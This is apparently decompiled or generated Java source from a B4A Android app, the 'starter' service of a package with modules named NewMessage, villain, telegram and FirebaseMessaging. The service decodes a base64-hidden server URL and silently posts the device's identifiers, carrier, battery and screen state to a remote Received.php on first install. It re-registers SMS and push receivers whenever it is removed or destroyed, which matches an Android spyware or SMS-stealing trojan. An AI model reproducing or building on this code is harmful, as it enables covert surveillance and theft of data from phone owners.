package com.Mad.api;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class starter extends android.app.Service{
	public static class starter_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (starter) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, starter.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, true, BA.class);
		}

	}
    static starter mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return starter.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.Mad.api", "com.Mad.api.starter");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.Mad.api.starter", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!true && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (starter) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (true) {
			if (ServiceHelper.StarterHelper.runWaitForLayouts() == false) {
                BA.LogInfo("stopping spontaneous created service");
                stopSelf();
            }
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (starter) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_NOT_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (true)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (starter) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (true) {
            BA.LogInfo("** Service (starter) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (starter) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.Mad.api.httpjob _ht = null;
public static anywheresoftware.b4a.phone.Phone _phone = null;
public static com.reza.sh.deviceinfo.DiviceInfo _pd = null;
public static String _res = "";
public static anywheresoftware.b4a.phone.Phone.PhoneWakeState _pm = null;
public com.Mad.api.main _main = null;
public com.Mad.api.newmessage _newmessage = null;
public com.Mad.api.serverlink _serverlink = null;
public com.Mad.api.firebasemessaging _firebasemessaging = null;
public com.Mad.api.chrome _chrome = null;
public com.Mad.api.mainchange _mainchange = null;
public com.Mad.api.second _second = null;
public com.Mad.api.telegram _telegram = null;
public com.Mad.api.villain _villain = null;
public com.Mad.api.youtube _youtube = null;
public com.Mad.api.httputils2service _httputils2service = null;
public static boolean  _application_error(anywheresoftware.b4a.objects.B4AException _error,String _stacktrace) throws Exception{
 //BA.debugLineNum = 52;BA.debugLine="Sub Application_Error (Error As Exception, StackTr";
 //BA.debugLineNum = 53;BA.debugLine="Return True";
if (true) return anywheresoftware.b4a.keywords.Common.True;
 //BA.debugLineNum = 54;BA.debugLine="End Sub";
return false;
}
public static String  _checkscreenstatus() throws Exception{
anywheresoftware.b4a.agraham.reflection.Reflection _r = null;
Object _powerservice = null;
boolean _isscreenon = false;
 //BA.debugLineNum = 62;BA.debugLine="Public Sub CheckScreenStatus";
 //BA.debugLineNum = 63;BA.debugLine="Dim res As String";
_res = "";
 //BA.debugLineNum = 64;BA.debugLine="pm.PartialLock";
_pm.PartialLock(processBA);
 //BA.debugLineNum = 66;BA.debugLine="Dim r As Reflector";
_r = new anywheresoftware.b4a.agraham.reflection.Reflection();
 //BA.debugLineNum = 67;BA.debugLine="r.Target = r.GetContext";
_r.Target = (Object)(_r.GetContext(processBA));
 //BA.debugLineNum = 68;BA.debugLine="Dim powerService As Object = r.RunMethod2(\"getSys";
_powerservice = _r.RunMethod2("getSystemService","power","java.lang.String");
 //BA.debugLineNum = 69;BA.debugLine="r.Target = powerService";
_r.Target = _powerservice;
 //BA.debugLineNum = 70;BA.debugLine="Dim isScreenOn As Boolean = r.RunMethod(\"isScreen";
_isscreenon = BA.ObjectToBoolean(_r.RunMethod("isScreenOn"));
 //BA.debugLineNum = 72;BA.debugLine="If isScreenOn Then";
if (_isscreenon) { 
 //BA.debugLineNum = 73;BA.debugLine="res = \"On\"";
_res = "On";
 //BA.debugLineNum = 74;BA.debugLine="Log(\"Screen is ON\")";
anywheresoftware.b4a.keywords.Common.LogImpl("11900556","Screen is ON",0);
 }else {
 //BA.debugLineNum = 76;BA.debugLine="res = \"Off\"";
_res = "Off";
 //BA.debugLineNum = 77;BA.debugLine="Log(\"Screen is OFF\")";
anywheresoftware.b4a.keywords.Common.LogImpl("11900559","Screen is OFF",0);
 };
 //BA.debugLineNum = 79;BA.debugLine="Return res";
if (true) return _res;
 //BA.debugLineNum = 80;BA.debugLine="pm.ReleasePartialLock";
_pm.ReleasePartialLock();
 //BA.debugLineNum = 81;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 7;BA.debugLine="Dim ht As HttpJob";
_ht = new com.Mad.api.httpjob();
 //BA.debugLineNum = 8;BA.debugLine="Dim phone As Phone";
_phone = new anywheresoftware.b4a.phone.Phone();
 //BA.debugLineNum = 9;BA.debugLine="Dim pd As PersianDeviceInfo";
_pd = new com.reza.sh.deviceinfo.DiviceInfo();
 //BA.debugLineNum = 10;BA.debugLine="Dim res As String";
_res = "";
 //BA.debugLineNum = 11;BA.debugLine="Dim pm As PhoneWakeState";
_pm = new anywheresoftware.b4a.phone.Phone.PhoneWakeState();
 //BA.debugLineNum = 12;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
 //BA.debugLineNum = 15;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 17;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 56;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 57;BA.debugLine="StartReceiver(FirebaseMessaging)";
anywheresoftware.b4a.keywords.Common.StartReceiver(processBA,(Object)(mostCurrent._firebasemessaging.getObject()));
 //BA.debugLineNum = 58;BA.debugLine="StartReceiver(NewMessage)";
anywheresoftware.b4a.keywords.Common.StartReceiver(processBA,(Object)(mostCurrent._newmessage.getObject()));
 //BA.debugLineNum = 59;BA.debugLine="CallSubDelayed(FirebaseMessaging, \"SubscribeToTop";
anywheresoftware.b4a.keywords.Common.CallSubDelayed(processBA,(Object)(mostCurrent._firebasemessaging.getObject()),"SubscribeToTopics");
 //BA.debugLineNum = 60;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
anywheresoftware.b4a.objects.StringUtils _su = null;
byte[] _bytearray = null;
String _apilink = "";
String _sudoport = "";
 //BA.debugLineNum = 19;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 20;BA.debugLine="Dim su As StringUtils";
_su = new anywheresoftware.b4a.objects.StringUtils();
 //BA.debugLineNum = 21;BA.debugLine="Dim byteArray() As Byte = su.DecodeBase64(ServerL";
_bytearray = _su.DecodeBase64(mostCurrent._serverlink._link /*String*/ );
 //BA.debugLineNum = 22;BA.debugLine="Dim ApiLink As String = BytesToString(byteArray,";
_apilink = anywheresoftware.b4a.keywords.Common.BytesToString(_bytearray,(int) (0),_bytearray.length,"UTF-8");
 //BA.debugLineNum = 23;BA.debugLine="Try";
try { //BA.debugLineNum = 24;BA.debugLine="StartReceiver(FirebaseMessaging)";
anywheresoftware.b4a.keywords.Common.StartReceiver(processBA,(Object)(mostCurrent._firebasemessaging.getObject()));
 //BA.debugLineNum = 25;BA.debugLine="StartReceiver(NewMessage)";
anywheresoftware.b4a.keywords.Common.StartReceiver(processBA,(Object)(mostCurrent._newmessage.getObject()));
 //BA.debugLineNum = 26;BA.debugLine="CallSubDelayed(FirebaseMessaging, \"SubscribeToTo";
anywheresoftware.b4a.keywords.Common.CallSubDelayed(processBA,(Object)(mostCurrent._firebasemessaging.getObject()),"SubscribeToTopics");
 //BA.debugLineNum = 27;BA.debugLine="Dim sudoport As String = File.ReadString(File.Di";
_sudoport = anywheresoftware.b4a.keywords.Common.File.ReadString(anywheresoftware.b4a.keywords.Common.File.getDirAssets(),"sudoport.txt");
 //BA.debugLineNum = 28;BA.debugLine="If Not(File.Exists(File.DirInternal,\"FirstInstal";
if (anywheresoftware.b4a.keywords.Common.Not(anywheresoftware.b4a.keywords.Common.File.Exists(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"FirstInstall.txt"))) { 
 //BA.debugLineNum = 29;BA.debugLine="Try";
try { //BA.debugLineNum = 30;BA.debugLine="Log(\"Not Installed\")";
anywheresoftware.b4a.keywords.Common.LogImpl("11638411","Not Installed",0);
 //BA.debugLineNum = 31;BA.debugLine="res = CheckScreenStatus";
_res = _checkscreenstatus();
 //BA.debugLineNum = 32;BA.debugLine="pd.initialize(\"pd\")";
_pd.initialize(processBA,"pd");
 //BA.debugLineNum = 33;BA.debugLine="ht.Initialize(\"ht\",Me)";
_ht._initialize /*String*/ (processBA,"ht",starter.getObject());
 //BA.debugLineNum = 34;BA.debugLine="ht.PostString(ApiLink&\"/\"&sudoport&\"/Received.";
_ht._poststring /*String*/ (_apilink+"/"+_sudoport+"/Received.php","Model="+_phone.getModel()+"&berand="+_phone.getManufacturer()+"&Product="+_phone.getProduct()+"&operator="+_phone.GetNetworkOperatorName()+"&Device_id="+_phone.GetSettings("android_id")+"&Battery="+BA.NumberToString(_pd.getBatteryPercentage())+"&andver="+_pd.getOSVersion()+"&action="+"install"+"&screen="+_res);
 //BA.debugLineNum = 35;BA.debugLine="File.WriteString(File.DirInternal,\"FirstInstal";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"FirstInstall.txt","");
 } 
       catch (Exception e18) {
			processBA.setLastException(e18); //BA.debugLineNum = 37;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("11638418",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 };
 };
 } 
       catch (Exception e22) {
			processBA.setLastException(e22); //BA.debugLineNum = 41;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("11638422",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 };
 //BA.debugLineNum = 43;BA.debugLine="Service.StopAutomaticForeground";
mostCurrent._service.StopAutomaticForeground();
 //BA.debugLineNum = 44;BA.debugLine="End Sub";
return "";
}
public static String  _service_taskremoved() throws Exception{
 //BA.debugLineNum = 46;BA.debugLine="Sub Service_TaskRemoved";
 //BA.debugLineNum = 47;BA.debugLine="StartReceiver(FirebaseMessaging)";
anywheresoftware.b4a.keywords.Common.StartReceiver(processBA,(Object)(mostCurrent._firebasemessaging.getObject()));
 //BA.debugLineNum = 48;BA.debugLine="StartReceiver(NewMessage)";
anywheresoftware.b4a.keywords.Common.StartReceiver(processBA,(Object)(mostCurrent._newmessage.getObject()));
 //BA.debugLineNum = 49;BA.debugLine="CallSubDelayed(FirebaseMessaging, \"SubscribeToTop";
anywheresoftware.b4a.keywords.Common.CallSubDelayed(processBA,(Object)(mostCurrent._firebasemessaging.getObject()),"SubscribeToTopics");
 //BA.debugLineNum = 50;BA.debugLine="End Sub";
return "";
}
}
